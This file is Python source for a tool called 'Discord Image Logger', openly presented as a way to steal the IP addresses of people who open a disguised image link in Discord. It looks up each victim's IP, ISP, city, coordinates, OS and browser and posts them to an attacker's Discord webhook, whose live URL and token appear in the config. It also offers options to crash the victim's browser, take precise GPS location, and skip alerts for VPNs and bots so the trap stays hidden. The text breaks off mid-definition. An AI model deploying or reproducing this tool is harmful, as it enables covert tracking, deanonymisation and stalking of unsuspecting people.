# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1119822608435793970/18XsDNRxHzzKlLn99bjFozRaSlSvkcsHvj_WDnYTXYI3LNqtHRZjApFOF6MkwocHXaEM",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
